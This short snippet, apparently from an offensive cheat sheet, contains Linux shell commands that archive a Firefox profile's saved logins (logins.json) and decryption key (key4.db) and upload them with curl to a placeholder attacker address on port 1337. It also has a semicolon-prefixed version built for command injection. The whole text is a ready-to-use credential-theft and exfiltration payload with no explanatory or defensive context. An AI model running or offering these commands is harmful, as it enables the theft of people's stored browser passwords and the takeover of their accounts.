===========================================   Linux   ============================================

Shell:
cd ~/.mozilla/firefox/*.default-esr
tar czf /tmp/profile.tar.gz logins.json key4.db
curl --data-binary "@/tmp/profile.tar.gz" -H "X-Filename: profile.tar.gz" ipv4_address:1337

Payload:
; cd ~/.mozilla/firefox/*.default-esr; tar czf /tmp/profile.tar.gz logins.json key4.db | curl --data-binary "@/tmp/profile.tar.gz" -H "X-Filename: profile.tar.gz" ipv4_address:1337